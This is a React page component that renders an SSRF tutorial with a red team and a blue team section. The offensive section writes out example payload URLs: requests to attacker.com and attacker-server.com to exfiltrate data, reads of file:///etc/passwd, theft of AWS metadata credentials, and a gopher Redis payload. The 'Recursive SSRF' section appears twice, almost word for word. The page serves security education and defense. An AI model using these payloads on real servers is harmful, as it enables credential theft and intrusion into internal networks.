export default function SSRFPage() {
  return (
    <main className="p-8 max-w-4xl mx-auto font-sans text-white">
      <h1 className="text-4xl font-extrabold mb-8 text-purple-600">Server-Side Request Forgery (SSRF) Comprehensive Guide</h1>

      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-3">What is SSRF?</h2>
        <p className="leading-relaxed">
          Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to make the server perform unauthorized requests on behalf of the attacker. 
          This can be used to access internal systems, read sensitive metadata, or even pivot into private networks.
        </p>
        <div className="mt-4 p-4 bg-gray-800 rounded-lg">
          <h3 className="text-lg font-semibold mb-2 text-orange-300">SSRF Impact Severity:</h3>
          <ul className="list-disc list-inside space-y-1">
            <li>Access to internal services (databases, admin panels)</li>
            <li>Cloud metadata exposure (AWS IAM keys, Azure tokens)</li>
            <li>Port scanning of internal networks</li>
            <li>Remote code execution via internal services</li>
            <li>Bypass of firewall restrictions</li>
          </ul>
        </div>
      </section>






      <section className="mb-10">
        <h2 className="text-3xl font-semibold mb-4 text-red-600">Red Team Techniques (Offensive)</h2>






        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">1. Basic SSRF (Server-Side Request Forgery)</h3>
          <p className="mb-3">
            Server-Side Request Forgery (SSRF) occurs when an attacker can make a vulnerable server send HTTP requests to arbitrary internal or external resources. This can lead to data leakage, internal service access, and even remote code execution in some configurations.
          </p>

          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">Basic External Request</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://vulnerable.com/api/fetch?url=http://attacker.com`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">Attacker forces the backend to make a request to a domain they control, potentially exfiltrating data.</p>
            </div>

            <div>
              <h4 className="font-medium mb-1">File Protocol (Local File Access)</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://vulnerable.com/export?template=file:///etc/passwd`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">Reads sensitive files from the local filesystem if not properly restricted.</p>
            </div>

            <div>
              <h4 className="font-medium mb-1">Internal Service Discovery</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://vulnerable.com/api/fetch?url=http://127.0.0.1:8000/admin`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">Used to probe internal-only services such as cloud metadata endpoints, admin panels, or Redis instances.</p>
            </div>

            <div>
              <h4 className="font-medium mb-1">Cloud Metadata Exploitation (AWS)</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://vulnerable.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">Attempts to access AWS EC2 metadata service to steal instance credentials.</p>
            </div>

            <div className="p-3 bg-red-900/30 rounded">
              <h4 className="font-medium mb-1">Common SSRF Targets:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li><strong>Cloud metadata services:</strong> AWS, GCP, Azure metadata endpoints</li>
                <li><strong>Internal services:</strong> Admin panels, databases, Redis, MongoDB, etc.</li>
                <li><strong>Localhost services:</strong> <code>127.0.0.1</code>, <code>localhost</code>, <code>0.0.0.0</code>, etc.</li>
                <li><strong>File protocols:</strong> <code>file://</code>, <code>dict://</code>, <code>gopher://</code></li>
              </ul>
            </div>

          </div>
        </article>





        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">2. Blind SSRF</h3>
          <p className="mb-3">
            Blind Server-Side Request Forgery (Blind SSRF) occurs when the server performs a request, but the response is not directly visible to the attacker. Exploitation requires side-channel feedback, such as DNS callbacks or external logs. It's often used to exfiltrate data, scan internal networks, or trigger actions on internal services.
          </p>

          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">DNS-Based Exfiltration</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://vulnerable.com/fetch?url=http://abc.attacker-server.com`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">
                Attacker monitors DNS logs for <code>abc.attacker-server.com</code> to confirm server-side request execution.
              </p>
            </div>

            <div>
              <h4 className="font-medium mb-1">AWS Metadata Fetch (No Direct Output)</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">
                If the server doesn’t return the response but internally logs it or stores it somewhere retrievable later, credentials may still be exposed.
              </p>
            </div>

            <div>
              <h4 className="font-medium mb-1">Trigger via Gopher Protocol (Redis RCE)</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`gopher://127.0.0.1:6379/_%2A1%0D%0ASET%0D%0Aevil%0D%0A"payload"`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">
                Sends raw payloads to internal services like Redis or Memcached — no output returned but action is performed.
              </p>
            </div>

            <div>
              <h4 className="font-medium mb-1">Out-of-Band Detection Using Collaborator</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://target.com/render?url=http://burpcollaborator.net/abc123`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">
                Uses platforms like <code>Burp Collaborator</code> or <code>Canarytokens</code> to receive pingback or DNS resolution.
              </p>
            </div>

            <div className="p-3 bg-red-900/30 rounded">
              <h4 className="font-medium mb-1">Common Feedback Channels for Blind SSRF:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>DNS logs from controlled domain</li>
                <li>Server logs or cache entries</li>
                <li>Out-of-band services (Burp Collaborator, Interact.sh)</li>
                <li>Email/Slack/webhook notifications triggered by SSRF action</li>
              </ul>
            </div>

          </div>
        </article>




        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">3. Authenticated SSRF</h3>
          <p className="mb-3">
            Authenticated SSRF vulnerabilities require the attacker to be logged in or have valid credentials. The attacker abuses functionality available only to authenticated users to trigger server-side requests, often targeting internal services or sensitive endpoints accessible within the trusted network.
          </p>

          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">Example: Fetch Internal Admin Panel</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`POST /user/settings/fetch HTTP/1.1
Host: vulnerable.com
Content-Type: application/json
Cookie: session=valid_user_session_token

{
  "url": "http://127.0.0.1:8080/admin"
}`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">
                Authenticated attacker leverages a feature that fetches URLs, causing the server to access an internal admin interface not accessible externally.
              </p>
            </div>

            <div>
              <h4 className="font-medium mb-1">Example: Cloud Metadata Access via Authenticated Request</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`GET /profile?avatar=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: vulnerable.com
Cookie: session=valid_user_session_token`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">
                Logged-in users’ requests are abused to retrieve sensitive cloud credentials through SSRF.
              </p>
            </div>

            <div className="p-3 bg-red-900/30 rounded">
              <h4 className="font-medium mb-1">Why Authenticated SSRF Is Dangerous:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>Allows attackers to leverage user privileges inside the application</li>
                <li>Enables access to otherwise protected internal systems</li>
                <li>May lead to privilege escalation if sensitive internal endpoints are exposed</li>
                <li>Harder to detect since traffic looks like legitimate authenticated activity</li>
              </ul>
            </div>

            <div>
              <h4 className="font-medium mb-1">Mitigation Techniques:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1 text-sm text-gray-400">
                <li>Implement strict input validation and URL allowlisting</li>
                <li>Restrict sensitive internal endpoints from being accessed via SSRF vectors</li>
                <li>Limit functionality that allows fetching URLs to trusted sources only</li>
                <li>Use network segmentation to separate internal resources</li>
                <li>Monitor authenticated user actions for unusual SSRF attempts</li>
              </ul>
            </div>
          </div>
        </article>






        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">4. Recursive SSRF</h3>
          <p className="mb-3">
            Recursive SSRF occurs when a server-side request triggered by SSRF leads to another internal request, creating a chain or loop of requests. This can be exploited to scan internal networks, amplify attacks, or reach deeply nested internal resources that are not directly accessible.
          </p>

          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">Example: SSRF Triggering Internal Redirect</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://vulnerable.com/api/fetch?url=http://internal-service.local/redirect?target=http://127.0.0.1/admin`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">
                The initial SSRF request triggers a redirect that causes the server to make an additional request to another internal URL.
              </p>
            </div>

            <div>
              <h4 className="font-medium mb-1">Example: Chained SSRF to Scan Network</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://vulnerable.com/api/fetch?url=http://10.0.0.5:8080/scan?next=10.0.0.6`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">
                A crafted SSRF request triggers the server to scan a network range recursively by chaining internal requests through vulnerable endpoints.
              </p>
            </div>

            <div>
              <h4 className="font-medium mb-1">Amplification via Recursive Requests</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://vulnerable.com/api/fetch?url=http://internal-service.local/fetch?url=http://another-service.local/admin`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">
                Recursive SSRF can cause multiple internal requests cascading from one initial attacker-controlled input.
              </p>
            </div>

            <div className="p-3 bg-red-900/30 rounded">
              <h4 className="font-medium mb-1">Risks of Recursive SSRF:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>Internal network discovery and enumeration</li>
                <li>Amplified attack surface increasing the chance of sensitive data exposure</li>
                <li>Potential for Denial-of-Service by exhausting server resources</li>
                <li>Harder to detect due to multi-step indirect requests</li>
              </ul>
            </div>

          </div>
        </article>



        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">5. Recursive SSRF</h3>
          <p className="mb-3">
            Recursive SSRF occurs when a server-side request triggered by SSRF leads to another internal request, creating a chain or loop of requests. This can be exploited to scan internal networks, amplify attacks, or reach deeply nested internal resources that are not directly accessible.
          </p>

          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">Example: SSRF Triggering Internal Redirect</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://vulnerable.com/api/fetch?url=http://internal-service.local/redirect?target=http://127.0.0.1/admin`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">
                The initial SSRF request triggers a redirect that causes the server to make an additional request to another internal URL.
              </p>
            </div>

            <div>
              <h4 className="font-medium mb-1">Example: Chained SSRF to Scan Network</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://vulnerable.com/api/fetch?url=http://10.0.0.5:8080/scan?next=10.0.0.6`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">
                A crafted SSRF request triggers the server to scan a network range recursively by chaining internal requests through vulnerable endpoints.
              </p>
            </div>

            <div>
              <h4 className="font-medium mb-1">Amplification via Recursive Requests</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://vulnerable.com/api/fetch?url=http://internal-service.local/fetch?url=http://another-service.local/admin`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">
                Recursive SSRF can cause multiple internal requests cascading from one initial attacker-controlled input.
              </p>
            </div>

            <div className="p-3 bg-red-900/30 rounded">
              <h4 className="font-medium mb-1">Risks of Recursive SSRF:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>Internal network discovery and enumeration</li>
                <li>Amplified attack surface increasing the chance of sensitive data exposure</li>
                <li>Potential for Denial-of-Service by exhausting server resources</li>
                <li>Harder to detect due to multi-step indirect requests</li>
              </ul>
            </div>

            <div>
              <h4 className="font-medium mb-1">Mitigation Strategies:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1 text-sm text-gray-400">
                <li>Implement strict request validation and allowlisting</li>
                <li>Limit or block redirects and chained requests within internal services</li>
                <li>Monitor and rate-limit outbound server requests</li>
                <li>Use network segmentation to minimize accessible internal endpoints</li>
              </ul>
            </div>
          </div>
        </article>


      </section>






      <section className="mb-10">
        <h2 className="text-3xl font-semibold mb-4 text-blue-600">Blue Team Defenses (Defensive)</h2>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">1. Input Validation</h3>
          
          <h4 className="font-medium mb-1 mt-3">Strict Allowlisting</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`// Only allow specific domains
const ALLOWED_DOMAINS = ['api.trusted.com', 'cdn.safe.org'];

if (!ALLOWED_DOMAINS.includes(new URL(input).hostname)) {
  throw new Error('Domain not allowed');
}`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">Block Reserved Ranges</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`// Reject private, localhost, and cloud IPs
function isForbiddenIP(ip) {
  return ip.match(/^127\.|^10\.|^192\.168\.|^172\.(1[6-9]|2[0-9]|3[0-1])\.|^169\.254\./);
}`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">2. Network Controls</h3>
          
          <h4 className="font-medium mb-1 mt-3">Egress Filtering</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Restrict outbound connections</li>
            <li>Block internal IP ranges</li>
            <li>Implement proxy whitelisting</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Cloud Protections</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>AWS IMDSv2 (required)</li>
            <li>GCP metadata restrictions</li>
            <li>Azure metadata firewall rules</li>
          </ul>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">3. Secure Coding Practices</h3>
          
          <h4 className="font-medium mb-1 mt-3">Safe Libraries</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Use <code>requests</code> with <code>allow_redirects=False</code></li>
            <li>Avoid <code>file://</code>, <code>gopher://</code>, <code>dict://</code></li>
            <li>Disable following redirects</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Framework Protections</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`# Django SSRF Protection
from django_ssrf.protection import SSRFProtect

@SSRFProtect
def fetch_url(request):
    # Your view code`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">4. Monitoring & Detection</h3>
          
          <h4 className="font-medium mb-1 mt-3">Log Analysis</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Monitor for internal IP requests</li>
            <li>Alert on metadata endpoint access</li>
            <li>Track abnormal outbound traffic</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">WAF Rules</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Block known SSRF patterns</li>
            <li>Detect encoded IP addresses</li>
            <li>Flag DNS rebinding attempts</li>
          </ul>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">5. Cloud-Specific Protections</h3>
          
          <h4 className="font-medium mb-1 mt-3">AWS</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Enforce IMDSv2</li>
            <li>Use instance metadata firewall</li>
            <li>Restrict IAM roles</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Azure</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Disable metadata service where unused</li>
            <li>Use managed identities</li>
            <li>Implement network security groups</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">GCP</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Disable legacy metadata endpoints</li>
            <li>Use workload identity</li>
            <li>Restrict metadata access</li>
          </ul>
        </article>
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-semibold mb-4">Additional Resources & References</h2>
        <div className="space-y-6">
          <div className="bg-gray-800 p-4 rounded-lg">
            <h3 className="text-xl font-semibold mb-3 text-yellow-400">Learning Resources</h3>
            <ul className="space-y-3">
              <li>
                <a href="https://portswigger.net/web-security/ssrf" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  PortSwigger SSRF Academy — Interactive labs
                </a>
              </li>
              <li>
                <a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  OWASP SSRF — Comprehensive documentation
                </a>
              </li>
              <li>
                <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  PayloadsAllTheThings SSRF — Cheat sheet
                </a>
              </li>
            </ul>
          </div>
          <div className="bg-gray-800 p-4 rounded-lg">
            <h3 className="text-xl font-semibold mb-3 text-yellow-400">Security Tools</h3>
            <ul className="space-y-3">
              <li>
                <a href="https://github.com/swisskyrepo/SSRFmap" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  SSRFmap — Automated exploitation tool
                </a>
              </li>
              <li>
                <a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  Gopherus — Generate Gopher payloads
                </a>
              </li>
              <li>
                <a href="https://github.com/projectdiscovery/interactsh" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  Interactsh — OOB interaction server
                </a>
              </li>
            </ul>
          </div>
        </div>
      </section>

      <div className="p-4 bg-gray-800 rounded-lg border-l-4 border-yellow-500">
        <h3 className="text-lg font-semibold mb-2 text-yellow-400">SSRF Mitigation Checklist</h3>
        <ul className="list-disc list-inside ml-4 space-y-1">
          <li>Implement strict URL allowlisting</li>
          <li>Validate and sanitize all user-supplied URLs</li>
          <li>Block access to internal IP ranges and metadata services</li>
          <li>Use network segmentation for sensitive backends</li>
          <li>Enable cloud provider metadata protections (IMDSv2)</li>
          <li>Monitor for suspicious outbound requests</li>
          <li>Regularly test SSRF protections</li>
        </ul>
      </div>
    </main>
  );
}
